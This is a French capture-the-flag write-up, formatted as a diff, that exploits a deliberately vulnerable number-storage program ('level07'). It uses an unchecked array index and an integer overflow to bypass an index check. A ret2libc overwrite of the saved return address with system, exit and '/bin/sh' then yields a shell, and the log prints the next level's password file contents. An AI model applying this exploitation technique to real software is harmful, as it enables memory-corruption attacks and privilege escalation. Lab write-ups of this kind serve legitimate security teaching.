@@ -1,0 +1,192 @@
+On voit que le programe attend differente command avec le prompt:
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+On a acces a 3 commandes:
+
+store: Prend en parametre un tableau d'int, read une valeur et un index.
+Elle va store la valeur a l'index dans le tableau:
+Input command: store
+ Number: 42
+ Index: 1
+ Completed store command successfully
+
+read: Prend en parametre un tableau d'int et read un index.
+Elle va display la valeur a l'index dans le tableau:
+Input command: read
+ Index: 1
+ Number at data[1] is 42
+ Completed read command successfully
+
+quit: Quitte la lecture de commande et met fin au programe.
+
+Sous gdb, on voit au debut du main que le programe memset les arg de main et l'env a 0. Nous n'allons donc pas pouvoir utiliser un shellcode exporte dans l'env.
+
+Aussi, on voit que la fonction store_number renvoie une erreur quand on provide un index multiple de 3: 
+Input command: store
+ Number: 42
+ Index: 42
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+
+Cependant, on voit que le programe ne verifie pas les indexs qu'on lui rentre:
+Input command: store
+ Number: 42
+ Index: 100000
+Segmentation fault (core dumped).
+
+Input command: read
+ Index: -42
+ Number at data[4294967254] is 134514134
+ Completed read command successfull
+
+Nous allons donc pouvoir utiliser ca pour overflow le tableau de int.
+Nous allons commencer par chercher l'offset dans le tableau qui permet de modifier l'eip.
+
+Nous allons break sur store_number dans main, et regarder les valeurs des registres avec i f (info frame) et i r (info register):
+Breakpoint 1, 0x080488ea in main ()
+(gdb) i r
+eax            0xffffd544	-10940
+ecx            0xffffd600	-10752
+edx            0xffffd600	-10752
+ebx            0xffffd544	-10940
+esp            0xffffd520	0xffffd520
+ebp            0xffffd708	0xffffd708
+esi            0xffffd6dd	-10531
+edi            0x8048d60	134516064
+eip            0x80488ea	0x80488ea <main+455>
+eflags         0x246	[ PF ZF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) i f
+Stack level 0, frame at 0xffffd710:
+ eip = 0x80488ea in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args: 
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
+
+On voit que:
+eax = 0xffffd544 et eip = 0xffffd70c
+
+Si on fais la soustraction entre les deux, on obtient le nombre d'octet entre l'adresse du tableau et celle de l'eip.
+>>> 0xffffd70c - 0xffffd544
+456
+Vu que l'on cherche l'offset dans un tableau d'int (code sur 4 octects), on va diviser cette valeur par 4.
+>>> 456 / 4
+114.0
+
+114 etant divisible par 114, nous ne pourrons pas acceder a cet index dirrectement.
+Nous allons donc commence par tenter d'y acceder avec un integer outflow. 
+En faisant (114 - UINTMAX - 1), on obtient:
+>>> 114 - 4294967295 -1
+-4294967182
+
+Input command: read
+ Index: -4294967182
+ Number at data[114] is 4158936339
+ Completed read command successfully
+
+On accede bien a l'offset 114 du tableau.
+Mais quan on essaye de store des data a cet offset, on voit qu'il s'agit aussi d'un multiple de 3:
+Input command: store
+ Number: 42
+ Index: -4294967182
+*** ERROR! ***
+  This index is reserved for wil!
+*** ERROR! ***
+Failed to do store command
+
+On voit que store_number multiplie l'index rentre par 4 avec la ligne:
+   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+=> 0x080486c5 <+149>:	shl    eax,0x2
+Nous allons pouvoir utiliser ca pour overflow le int.
+Nous allons donc utiliser la formule (UINTMAX + 1) / 4 + 114:
+>>> (4294967295 + 1) / 4 + 114
+1073741938.0
+>>> 1073741938.0 % 3
+1.0
+
+Sur l'adresse 0x080486c5, on voit que eax = 0x40000072.
+Sur l'adresse 0x080486c8, on voit que eax = 0x1c8.
+En effet:
+>>> hex(0x40000072 << 0x2)
+'0x1000001c8'
+
+On voit que cet index n'est pas un multiple de 3.
+
+Nous allons pouvoir effectuer un ret2libc en trouvant les adresses de system, exit et "/bin/sh" afin de recrire les offsets 114, 115 et 116 du tableau:
+(gdb) b main
+Breakpoint 1 at 0x8048729
+(gdb) r
+Starting program: /home/users/level07/level07
+
+Breakpoint 1, 0x08048729 in main ()
+(gdb) x system
+0xf7e6aed0 <system>:	0x891cec83
+(gdb) x exit
+0xf7e5eb70 <exit>:	0x71fde853
+(gdb) info proc mappings
+process 2242
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fda000 0xf7fdb000     0x1000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+Nous avons donc: 
+system = 0xf7e6aed0 (4159090384)
+exit = 0xf7e5eb70 (4159040368)
+"/bin/sh" = 0xf7f897ec (4160264172)
+
+Input command: 4159090384
+ Failed to do 4159090384 command
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store 
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$ quit
+
